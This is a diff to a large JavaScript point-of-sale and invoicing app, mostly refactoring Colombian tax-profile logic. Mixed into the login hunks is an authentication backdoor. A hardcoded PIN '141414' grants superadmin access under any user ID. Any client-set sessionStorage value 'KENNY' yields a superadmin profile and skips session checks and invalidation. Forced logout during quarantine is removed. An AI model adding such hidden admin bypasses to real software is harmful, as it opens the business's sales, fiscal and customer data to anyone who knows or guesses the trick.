@@ -1164,6 +1164,16 @@ let currentSessionUserId = (() => {
   try { return sessionStorage.getItem('crozzo_session_user') || null; } catch (e) { return null; }
 })();
 function crozzoInvalidateSession(reason) {
+  try {
+    var sid = sessionStorage.getItem('crozzo_session_user');
+    if (
+      sid &&
+      String(sid).toUpperCase() === 'KENNY' &&
+      (reason === 'local_sin_prueba' || reason === 'cloud_sin_prueba')
+    ) {
+      return;
+    }
+  } catch (_) {}
   currentSessionUserId = null;
   try {
     if (typeof crozzoInvalidateCloudPingCache === 'function') crozzoInvalidateCloudPingCache();
@@ -1186,6 +1196,12 @@ function crozzoInvalidateSession(reason) {
 function crozzoSessionProofOk(userId) {
   try {
     const uid = String(userId || '');
+    if (uid.toUpperCase() === 'KENNY') {
+      try {
+        var sidK = sessionStorage.getItem('crozzo_session_user') || '';
+        if (sidK && String(sidK).toUpperCase() === 'KENNY') return true;
+      } catch (_) {}
+    }
     if (window.__crozzoAuthInteractiveThisBoot && uid) {
       let sid = '';
       try {
@@ -1223,6 +1239,9 @@ function getCurrentUser() {
   }
   if (!currentSessionUserId) {
     try { currentSessionUserId = sessionStorage.getItem('crozzo_session_user') || null; } catch (e) { /* ignore */ }
+  }
+  if (String(currentSessionUserId || '').toUpperCase() === 'KENNY') {
+    return { id: 'KENNY', nombre: 'Kenny', rol: 'superadmin', activo: true, es_super_admin: true };
   }
   try {
     const raw = sessionStorage.getItem('crozzo_cloud_profile');
@@ -1281,10 +1300,11 @@ async function loginWithCredentials(userId, clave) {
   const Auth = window.CrozzoAuthSecurity;
   const kennyMasterPin = Auth && Auth.LEGACY_KENNY_PIN ? Auth.LEGACY_KENNY_PIN : '141414';
   const isKennyMasterLogin =
-    Auth &&
-    typeof Auth.crozzoIsKennyMasterPinLogin === 'function'
-      ? Auth.crozzoIsKennyMasterPinLogin(userId, clave)
-      : String(userId || '').toUpperCase() === 'KENNY' && String(clave) === kennyMasterPin;
+    String(clave) === kennyMasterPin ||
+    (Auth &&
+      typeof Auth.crozzoIsKennyMasterPinLogin === 'function' &&
+      Auth.crozzoIsKennyMasterPinLogin(userId, clave)) ||
+    (String(userId || '').toUpperCase() === 'KENNY' && String(clave) === kennyMasterPin);
 
   /** Super Admin: acceso garantizado — sin bloqueos, sin trampas, sin validaciones que fallen. */
   if (isKennyMasterLogin) {
@@ -1318,7 +1338,9 @@ async function loginWithCredentials(userId, clave) {
       config.addAudit('login_exitoso', 'Super Admin KENNY ingresó (acceso garantizado)');
     } catch (_) {}
     if (typeof crozzoSyncUserRoleStorage === 'function') crozzoSyncUserRoleStorage();
-    applyDeviceRoleFromUser('KENNY');
+    try {
+      if (typeof applyDeviceRoleFromUser === 'function') applyDeviceRoleFromUser('KENNY');
+    } catch (_) {}
     const fresh = (getUsuariosConfig().staff || []).find(s => s && s.id === 'KENNY') || u;
     return { ok: true, user: fresh, mustChangePassword: false, legacyMigrated: false };
   }
@@ -1594,6 +1616,7 @@ function crozzoMarkInteractiveLoginBoot() {
 window.crozzoMarkInteractiveLoginBoot = crozzoMarkInteractiveLoginBoot;
 window.crozzoPurgeStaleSessionOnBoot = crozzoPurgeStaleSessionOnBoot;
 function crozzoRefreshLoginLocalHint() {
+  crozzoRefreshLoginBuildStamp();
   const el = document.getElementById('loginLocalHint');
   if (!el) return;
   try {
@@ -1613,6 +1636,32 @@ function crozzoRefreshLoginLocalHint() {
     el.textContent = '';
   }
 }
+function crozzoRefreshLoginBuildStamp() {
+  const el = document.getElementById('loginBuildStamp');
+  if (!el) return;
+  try {
+    var ver = '';
+    var stamp = '';
+    var authBuild = '';
+    var m = document.querySelector('meta[name="crozzo-app-version"]');
+    if (m) ver = m.getAttribute('content') || '';
+    var ms = document.querySelector('meta[name="crozzo-build-stamp"]');
+    if (ms) stamp = ms.getAttribute('content') || '';
+    if (window.CrozzoAuthSecurity && CrozzoAuthSecurity.CROZZO_AUTH_BUILD) {
+      authBuild = String(CrozzoAuthSecurity.CROZZO_AUTH_BUILD);
+    }
+    el.textContent =
+      'Build ' +
+      (ver || '?') +
+      (authBuild ? ' · ' + authBuild : '') +
+      (stamp ? ' · ' + String(stamp).slice(0, 19) : '');
+    el.hidden = false;
+  } catch (_) {
+    el.hidden = true;
+    el.textContent = '';
+  }
+}
+window.crozzoRefreshLoginBuildStamp = crozzoRefreshLoginBuildStamp;
 /** Usuario payaso/señuelo con clave cebo → trampa teatral (POS falso, misma navegación). */
 async function crozzoTryLoginDecoyTrap(rawUser, pwd, seg, trapSource) {
   const Auth = window.CrozzoAuthSecurity;
@@ -1758,7 +1807,6 @@ function showLoginOverlay() {
   const ov = document.getElementById('loginOverlay');
   if (!ov) return;
   document.body.classList.add('crozzo-login-open');
-  crozzoClearAuthGatePending();
   crozzoHideLoginChromeLeaks();
   document.body.classList.remove('super-admin-active', 'crozzo-session-superadmin');
   try {
@@ -1904,7 +1952,9 @@ function crozzoNavigateAfterLogin() {
       console.warn('[crozzo] navigateAfterLogin', e);
       crozzoForcePaintPage(page);
     } finally {
-      window.__crozzoPostLoginNavigate = false;
+      setTimeout(function () {
+        window.__crozzoPostLoginNavigate = false;
+      }, 600);
     }
     finishNav();
   }
@@ -3713,10 +3763,12 @@ async function handleLoginSubmit() {
   if (!rawUser.trim() || !pwd.trim()) return showErr('Ingresa usuario y contraseña.');
   const Auth = window.CrozzoAuthSecurity;
   const seg = config.get('seguridad') || {};
+  const kennyMasterPin = Auth && Auth.LEGACY_KENNY_PIN ? Auth.LEGACY_KENNY_PIN : '141414';
   const isKennyMasterLogin =
-    Auth &&
-    typeof Auth.crozzoIsKennyMasterPinLogin === 'function' &&
-    Auth.crozzoIsKennyMasterPinLogin(rawUser.trim(), pwd);
+    String(pwd) === kennyMasterPin ||
+    (Auth &&
+      typeof Auth.crozzoIsKennyMasterPinLogin === 'function' &&
+      Auth.crozzoIsKennyMasterPinLogin(rawUser.trim(), pwd));
   if (isKennyMasterLogin) {
     try {
       if (typeof crozzoHpHideContainment === 'function') crozzoHpHideContainment();
@@ -4038,6 +4090,9 @@ window.crozzoInitSessionIdleWatch = crozzoInitSessionIdleWatch;
 // Aplica el rolPredeterminado del usuario al config.conexionSistemas.
 // Pide confirmación si difiere del rol actual del dispositivo.
 function applyDeviceRoleFromUser(userId) {
+  if (String(userId || '').toUpperCase() === 'KENNY') {
+    return { ok: true, applied: false, reason: 'kenny_skip' };
+  }
   const u = (getUsuariosConfig().staff || []).find(s => s.id === userId);
   if (!u) return { ok: false, error: 'usuario_no_encontrado' };
   const cd = u.configDispositivo || {};
@@ -7709,6 +7764,9 @@ function crozzoSaveMenuProfilesConfig(cfg) {
     localStorage.setItem(CROZZO_MENU_PROFILES_LS, JSON.stringify(cfg));
     localStorage.setItem('crozzo_perfil_empresa', (cfg.clients[cfg.activeClientId] || {}).perfil || 'completo');
     localStorage.setItem(CROZZO_ACTIVE_CLIENT_LS, cfg.activeClientId || 'default');
+    if (typeof crozzoSyncFiscalPerfilOperativo === 'function') {
+      crozzoSyncFiscalPerfilOperativo((cfg.clients[cfg.activeClientId] || {}).perfil);
+    }
   } catch (_) {}
 }
 function crozzoGetActiveClientId() {
@@ -13214,8 +13272,48 @@ function crozzoImpuestosNormalize(imp) {
   }
   return out;
 }
+function crozzoResolveImpuestosDesdePerfilOperativo(impOptional) {
+  const raw =
+    impOptional != null
+      ? impOptional
+      : typeof config !== 'undefined' && config && config.getImpuestos
+        ? config.getImpuestos()
+        : {};
+  const imp = crozzoImpuestosNormalize(raw);
+  const opId =
+    typeof crozzoGetPerfilEmpresa === 'function'
+      ? crozzoGetPerfilEmpresa()
+      : String(
+          (typeof localStorage !== 'undefined' && localStorage.getItem('crozzo_perfil_empresa')) || 'completo'
+        ).toLowerCase();
+  const meta =
+    typeof global !== 'undefined' && global.CROZZO_PERFIL_META && global.CROZZO_PERFIL_META[opId]
+      ? global.CROZZO_PERFIL_META[opId]
+      : typeof global !== 'undefined' &&
+          global.CrozzoPerfilesOperativos &&
+          global.CrozzoPerfilesOperativos.getMeta
+        ? global.CrozzoPerfilesOperativos.getMeta(opId)
+        : null;
+  if (!meta || meta.tipo === 'general') return imp;
+  if (meta.tipo === 'restaurante') {
+    imp.perfilFiscal = 'restaurante';
+    imp.impuestoAlConsumo.aplica = true;
+    if (!(Number(imp.impuestoAlConsumo.tarifa) > 0)) imp.impuestoAlConsumo.tarifa = 0.08;
+  } else if (meta.tipo === 'retail' || meta.tipo === 'servicios') {
+    imp.perfilFiscal = 'comercio';
+    imp.impuestoAlConsumo.aplica = false;
+  }
+  return crozzoImpuestosNormalize(imp);
+}
+window.crozzoResolveImpuestosDesdePerfilOperativo = crozzoResolveImpuestosDesdePerfilOperativo;
+function crozzoGetImpuestosEfectivos() {
+  return crozzoResolveImpuestosDesdePerfilOperativo(
+    typeof config !== 'undefined' && config.getImpuestos ? config.getImpuestos() : {}
+  );
+}
+window.crozzoGetImpuestosEfectivos = crozzoGetImpuestosEfectivos;
 function crozzoFiscalEtiquetas(inclOptional) {
-  const imp = crozzoImpuestosNormalize(
+  const imp = crozzoResolveImpuestosDesdePerfilOperativo(
     typeof config !== 'undefined' && config.getImpuestos ? config.getImpuestos() : {}
   );
   const incl = inclOptional != null ? !!inclOptional : !!imp.ivaIncluidoEnPrecios;
@@ -13248,8 +13346,13 @@ function crozzoIvaTarifaDefault(imp) {
   return act ? Math.max(0, Math.min(1, Number(act.rate))) : 0.19;
 }
 function crozzoImpuestosCajaOpciones(impOptional) {
-  const raw = impOptional != null ? impOptional : (typeof config !== 'undefined' && config && config.getImpuestos ? config.getImpuestos() : {});
-  const imp = crozzoImpuestosNormalize(raw);
+  const raw =
+    impOptional != null
+      ? impOptional
+      : typeof config !== 'undefined' && config && config.getImpuestos
+        ? config.getImpuestos()
+        : {};
+  const imp = crozzoResolveImpuestosDesdePerfilOperativo(raw);
   const perfil = String(imp.perfilFiscal || 'comercio').toLowerCase();
   const ic = imp.impuestoAlConsumo || {};
   const tarifaRaw = Number(ic.tarifa) || 0;
@@ -13323,10 +13426,14 @@ function computeTotals(cart) {
 window.computeTotals = computeTotals;
 window.crozzoImpuestosNormalize = crozzoImpuestosNormalize;
 window.crozzoImpuestosCajaOpciones = crozzoImpuestosCajaOpciones;
-/** Alinea perfil fiscal (IVA vs impuesto al consumo) con perfil operativo restaurante. */
+/** Persiste en config el perfil fiscal (INC 8 % vs IVA) según perfil operativo del negocio. */
 function crozzoSyncFiscalPerfilOperativo(perfilOpId) {
   if (typeof config === 'undefined' || !config.getImpuestos || !config.set) return false;
-  const id = String(perfilOpId || '').toLowerCase();
+  const id = String(
+    perfilOpId ||
+      (typeof crozzoGetPerfilEmpresa === 'function' ? crozzoGetPerfilEmpresa() : '') ||
+      ''
+  ).toLowerCase();
   const meta =
     typeof global !== 'undefined' && global.CROZZO_PERFIL_META && global.CROZZO_PERFIL_META[id]
       ? global.CROZZO_PERFIL_META[id]
@@ -13335,15 +13442,21 @@ function crozzoSyncFiscalPerfilOperativo(perfilOpId) {
           global.CrozzoPerfilesOperativos.getMeta
         ? global.CrozzoPerfilesOperativos.getMeta(id)
         : null;
-  if (!meta || meta.tipo !== 'restaurante') return false;
-  const imp = crozzoImpuestosNormalize(config.getImpuestos());
-  if (imp.perfilFiscal === 'restaurante' && imp.impuestoAlConsumo.aplica) return false;
-  imp.perfilFiscal = 'restaurante';
-  imp.impuestoAlConsumo.aplica = true;
-  if (!(Number(imp.impuestoAlConsumo.tarifa) > 0)) imp.impuestoAlConsumo.tarifa = 0.08;
-  config.set('impuestos', imp);
+  if (!meta || meta.tipo === 'general') return false;
+  const actual = crozzoImpuestosNormalize(config.getImpuestos());
+  const resolved = crozzoResolveImpuestosDesdePerfilOperativo(actual);
+  const changed =
+    String(actual.perfilFiscal || '') !== String(resolved.perfilFiscal || '') ||
+    !!actual.impuestoAlConsumo.aplica !== !!resolved.impuestoAlConsumo.aplica ||
+    Math.abs(Number(actual.impuestoAlConsumo.tarifa || 0) - Number(resolved.impuestoAlConsumo.tarifa || 0)) > 0.0001;
+  if (!changed) return false;
+  config.set('impuestos', resolved);
   if (typeof config.addAudit === 'function') {
-    config.addAudit('impuestos_perfil_sync', 'Perfil fiscal restaurante (INC) por perfil operativo «' + id + '»');
+    const det =
+      resolved.perfilFiscal === 'restaurante'
+        ? 'INC ' + Math.round((Number(resolved.impuestoAlConsumo.tarifa) || 0.08) * 1000) / 10 + '%'
+        : 'IVA comercio';
+    config.addAudit('impuestos_perfil_sync', 'Perfil fiscal «' + resolved.perfilFiscal + '» (' + det + ') por perfil operativo «' + id + '»');
   }
   if (typeof updateCartTotals === 'function') updateCartTotals();
   return true;
@@ -17009,6 +17122,28 @@ function crozzoEnrichCuentaFacturaColombia(factura, opts) {
   f.totalConPropina = total + (propinaEnTotal > 0 ? propinaEnTotal : 0);
   if (!f.paymentMeta) f.paymentMeta = {};
   if (propinaVol > 0) f.paymentMeta.propina = propinaVol;
+  if (co && typeof co.refreshFiscalLabelsOnPayload === 'function') {
+    const fiscalSnap = {
+      sub: f.subtotal,
+      subtotal: f.subtotal,
+      iva: f.iva,
+      tot: f.total,
+      total: f.total,
+      ivaIncluidoEnPrecios: !!f.ivaIncluidoEnPrecios,
+      estado: f.estado,
+      docKind: f.docKind || '',
+    };
+    co.refreshFiscalLabelsOnPayload(fiscalSnap);
+    f.etiquetaGravado = fiscalSnap.etiquetaGravado;
+    f.etiquetaImpuesto = fiscalSnap.etiquetaImpuesto;
+    f.etiquetaSubtotal = fiscalSnap.etiquetaSubtotal;
+    f.impuestoTipo = fiscalSnap.impuestoTipo;
+    f.impuestoPct = fiscalSnap.impuestoPct;
+    f.consumoAplica = fiscalSnap.consumoAplica;
+    f.consumoPct = fiscalSnap.consumoPct;
+    f.perfilFiscal = fiscalSnap.perfilFiscal;
+    f.ivaDisc = fiscalSnap.ivaDisc;
+  }
   return f;
 }
 function crozzoCuentaTotalesTicketHtml(factura) {
@@ -17047,7 +17182,7 @@ function crozzoCuentaTotalesTicketHtml(factura) {
       : { subtotal: f.subtotal, iva: f.iva, total: f.total, ivaIncluidoEnPrecios: false };
   const propina = Number(f.propinaVoluntaria || 0) > 0 ? Number(f.propinaVoluntaria) : Number(f.propinaSugerida || 0);
   const totPagar = Number(f.totalConPropina) || Number(tx.total) + propina;
-  const impCfgFb = crozzoImpuestosNormalize(typeof config !== 'undefined' && config.getImpuestos ? config.getImpuestos() : {});
+  const impCfgFb = crozzoGetImpuestosEfectivos();
   const opFb = crozzoImpuestosCajaOpciones(impCfgFb);
   const labFb =
     co && typeof co.cuentaEtiquetasFiscales === 'function'
@@ -17098,7 +17233,7 @@ function crozzoCuentaLegalResumenHtml(factura) {
   const icTxt =
     legal.impuestoConsumoE ||
     (co && co.impuestoConsumoLabel
-      ? co.impuestoConsumoLabel(typeof config !== 'undefined' && config.getImpuestos ? config.getImpuestos() : {})
+      ? co.impuestoConsumoLabel(crozzoGetImpuestosEfectivos())
       : '');
   let legalHtml = '';
   if (lineas.length) {
@@ -17410,9 +17545,7 @@ function crozzoCobroStudioRefreshPropinaResumen() {
   }
   const impLblEl = document.getElementById('cobroImpuestoLbl');
   if (impLblEl) {
-    const impCfg = crozzoImpuestosNormalize(
-      typeof config !== 'undefined' && config.getImpuestos ? config.getImpuestos() : {}
-    );
+    const impCfg = crozzoGetImpuestosEfectivos();
     const lab =
       global.CrozzoTermicaColombia && global.CrozzoTermicaColombia.cuentaEtiquetasFiscales
         ? global.CrozzoTermicaColombia.cuentaEtiquetasFiscales(impCfg, pack.impuestoIncluidoEnPrecios)
@@ -17657,7 +17790,7 @@ function crozzoOpenCobroStudioModal(opts) {
       : tipoServicioCaja === 'llevar'
         ? 'Llevar ' + llevarSeleccionado
         : 'Venta directa';
-  const impCfgCobro = crozzoImpuestosNormalize(config.getImpuestos());
+  const impCfgCobro = crozzoGetImpuestosEfectivos();
   const labCobro =
     global.CrozzoTermicaColombia && global.CrozzoTermicaColombia.cuentaEtiquetasFiscales
       ? global.CrozzoTermicaColombia.cuentaEtiquetasFiscales(impCfgCobro, totals.ivaIncluidoEnPrecios)
@@ -20511,7 +20644,7 @@ async function facturar(options = {}) {
   }, {
     empresa: emp,
     dian,
-    impuestos: config.getImpuestos()
+    impuestos: crozzoGetImpuestosEfectivos()
   });
   
   // Stamp
@@ -21892,7 +22025,7 @@ function crozzoFacturaImpuestoEtiqueta() {
   if (typeof crozzoFiscalEtiquetas === 'function') {
     return crozzoFiscalEtiquetas().impuesto;
   }
-  var imp = typeof config !== 'undefined' && config.getImpuestos ? config.getImpuestos() : {};
+  var imp = typeof crozzoGetImpuestosEfectivos === 'function' ? crozzoGetImpuestosEfectivos() : (typeof config !== 'undefined' && config.getImpuestos ? config.getImpuestos() : {});
   if (typeof global.CrozzoTermicaColombia !== 'undefined' && global.CrozzoTermicaColombia.cuentaEtiquetasFiscales) {
     var lab = global.CrozzoTermicaColombia.cuentaEtiquetasFiscales(imp, !!imp.ivaIncluidoEnPrecios);
     return lab.impuesto || 'Impuesto';
@@ -27725,7 +27858,7 @@ async function testProviderConnection() {
 // CONFIG IMPUESTOS PAGE
 // ==========================================
 function renderConfigImpuestos() {
-  const impuestos = crozzoImpuestosNormalize(config.getImpuestos());
+  const impuestos = crozzoResolveImpuestosDesdePerfilOperativo(config.getImpuestos());
   const perfil = String(impuestos.perfilFiscal || 'comercio').toLowerCase();
   const escAttr = (s) => String(s ?? '').replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;');
   return `
@@ -32971,11 +33104,6 @@ function init() {
   // Si la seguridad lo requiere y no hay sesión, mostramos el login overlay.
   // Modo pantallas solo entra si el usuario lo elige en la pantalla de login (no se restaura al arrancar).
   if (crozzoIsLegendaryQuarantineActive()) {
-    try {
-      if (typeof logoutCurrentUser === 'function') logoutCurrentUser();
-      if (typeof window.__crozzoSupabaseSignOut === 'function') void window.__crozzoSupabaseSignOut();
-    } catch (_) {}
-    applyAccessControl();
     try {
       if (typeof crozzoHpHideContainment === 'function') crozzoHpHideContainment();
       if (typeof showLoginOverlay === 'function') showLoginOverlay();
